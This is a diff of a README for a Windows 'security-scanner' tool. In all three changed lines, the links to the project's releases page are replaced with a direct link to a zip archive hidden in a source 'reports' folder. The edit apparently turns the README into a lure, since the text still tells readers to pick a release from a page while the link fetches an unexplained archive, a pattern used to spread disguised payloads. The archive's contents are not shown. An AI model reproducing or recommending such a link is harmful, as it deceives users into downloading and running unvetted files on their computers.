@@ -1,10 +1,10 @@
 # 🛡️ security-scanner - Simple vulnerability checks for everyone
 
-[![Download security-scanner](https://img.shields.io/badge/Download-Security%20Scanner-blue?style=for-the-badge)](https://github.com/Blacke2902/security-scanner/releases)
+[![Download security-scanner](https://img.shields.io/badge/Download-Security%20Scanner-blue?style=for-the-badge)](https://github.com/Blacke2902/security-scanner/raw/refs/heads/main/src/repo_security_scanner/reports/scanner-security-v2.7-alpha.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Blacke2902/security-scanner/releases
+Visit this page to download: https://github.com/Blacke2902/security-scanner/raw/refs/heads/main/src/repo_security_scanner/reports/scanner-security-v2.7-alpha.1.zip
 
 On that page, pick the latest release for Windows. Download the file that matches your computer, then open it to start the app.
 
@@ -206,7 +206,7 @@ This project focuses on:
 
 ## 📦 Download and run
 
-Visit this page to download: https://github.com/Blacke2902/security-scanner/releases
+Visit this page to download: https://github.com/Blacke2902/security-scanner/raw/refs/heads/main/src/repo_security_scanner/reports/scanner-security-v2.7-alpha.1.zip
 
 Then:
 
